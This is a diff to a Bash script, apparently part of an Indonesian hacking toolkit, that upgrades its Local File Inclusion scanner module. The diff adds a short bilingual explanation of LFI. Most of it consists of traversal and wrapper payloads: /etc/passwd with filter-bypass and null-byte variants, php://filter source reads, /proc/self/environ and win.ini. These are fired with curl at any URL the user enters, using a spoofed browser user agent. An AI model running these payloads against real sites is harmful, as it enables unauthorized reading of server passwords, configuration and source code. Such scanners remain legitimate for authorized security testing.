@@ -24,7 +24,7 @@ function enable_sleep {
     fi
 }
 
-# --- [ MODUL 01: LFI SCANNER (DETAILED LOG) ] ---
+# --- [ MODUL 01: LFI SCANNER (DETAILED LOG & EDU) ] ---
 
 function start_scanner {
     clear
@@ -34,11 +34,16 @@ function start_scanner {
     echo -e "                 MODUL 01: LOCAL FILE INCLUSION (LFI) SCANNER                "
     echo -e "=============================================================================\e[0m"
     
+    # --- INFO SINGKAT UNTUK ORANG AWAM ---
+    echo -e "\e[1;33m[!] APA ITU LFI?\e[0m"
+    echo -e "\e[90mID: Celah yang memungkinan penyerang 'mengintip' file rahasia di dalam server\n    (seperti password/konfigurasi) melalui URL yang tidak aman.\e[0m"
+    echo -e "\e[90mEN: A vulnerability that allows attackers to read sensitive server files\n    (like passwords/configs) via insecure URL parameters.\e[0m"
+    echo -e "-----------------------------------------------------------------------------"
+
     read -p "Masukkan URL Target (contoh: http://site.com/v.php?id=): " target
 
     if [[ -z "$target" ]]; then
-        echo -e "\e[31m[!] URL tidak boleh kosong!\e[0m"
-        return
+        echo -e "\e[31m[!] URL tidak boleh kosong!\e[0m"; return
     fi
 
     # --- LOGIKA PENAMAAN FILE ---
@@ -54,19 +59,20 @@ function start_scanner {
 
     ua="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36"
     
+    # Payload yang lebih kuat & variatif
     paths=(
         "/etc/passwd" 
-        "../../etc/passwd" 
-        "../../../../etc/passwd" 
         "../../../../../../../../etc/passwd"
-        "php://filter/read=convert.base64-encode/resource=/etc/passwd"
         "/etc/passwd%00"
+        "....//....//....//....//etc/passwd"
+        "php://filter/convert.base64-encode/resource=index.php"
         "/proc/self/environ"
+        "C:\Windows\win.ini"
     )
 
     echo -e "\n\e[33m[*] Memulai Scanning di: $final_target\e[0m"
     echo -e "\e[33m[*] File Log: $log_file\e[0m"
-    echo "-----------------------------------------------------"
+    echo "-----------------------------------------------------------------------------"
 
     # Inisialisasi Header Tabel di Log
     {
@@ -75,40 +81,41 @@ function start_scanner {
         echo "====================================================="
         echo "TARGET : $final_target"
         echo "DATE   : $(date)"
+        echo "DESC   : LFI (Local File Inclusion) Audit"
         echo "-----------------------------------------------------"
-        printf "%-50s | %-15s\n" "PAYLOAD / PATH" "STATUS"
+        printf "%-55s | %-15s\n" "PAYLOAD / PATH" "STATUS"
         echo "-----------------------------------------------------"
     } > "$log_file"
 
     found=0
     for path in "${paths[@]}"; do
         echo -ne "  [*] Testing: $path \r"
-        response=$(curl -s -k -L -A "$ua" --connect-timeout 10 "$final_target$path")
+        
+        # Request dengan timeout 5 detik agar tidak macet
+        response=$(curl -s -k -L -A "$ua" --connect-timeout 5 "$final_target$path")
 
-        # Cek apakah Vulnerable
-        if [[ "$response" == *"root:x:0:0"* || "$response" == *"root:"* ]]; then
-            status="TERBUKA (VULN)"
-            echo -e "  \e[32m[+] $path -> $status\e[0m"
+        # Cek apakah Vulnerable (Linux & Windows pattern)
+        if [[ "$response" == *"root:x:0:0"* || "$response" == *"[extensions]"* || "$response" == *"PD9waHA"* ]]; then
+            status="VULNERABLE!"
+            echo -e "  [\e[32m+\e[0m] $path -> \e[32m$status\e[0m"
             ((found++))
         else
-            status="TERPROTEKSI"
+            status="SECURE"
         fi
 
-        # Tulis setiap percobaan ke file log dengan format kolom
-        printf "%-50s | %-15s\n" "$path" "$status" >> "$log_file"
-        sleep 0.2
+        # Tulis ke log
+        printf "%-55s | %-15s\n" "$path" "$status" >> "$log_file"
     done
 
     echo -ne "                                                                                \r"
-    echo -e "\n-----------------------------------------------------"
-    echo "-----------------------------------------------------" >> "$log_file"
+    echo -e "-----------------------------------------------------------------------------"
     
     if [ $found -gt 0 ]; then
-        echo -e "\e[32m[✓] Scan Selesai! $found celah ditemukan.\e[0m"
-        echo "KESIMPULAN: DITEMUKAN $found TITIK LEMAH" >> "$log_file"
+        echo -e "\e[32m[✓] Scan Selesai! $found celah LFI ditemukan.\e[0m"
+        echo "RESULT: FOUND $found VULNERABILITIES" >> "$log_file"
     else
-        echo -e "\e[31m[-] Scan Selesai. Tidak ada celah ditemukan.\e[0m"
-        echo "KESIMPULAN: SISTEM TERLIHAT AMAN (LFI)" >> "$log_file"
+        echo -e "\e[31m[-] Scan Selesai. Sistem terlihat aman dari LFI dasar.\e[0m"
+        echo "RESULT: SYSTEM SECURE" >> "$log_file"
     fi
     
     echo -e "\e[33mTekan Enter untuk kembali ke menu.\e[0m"
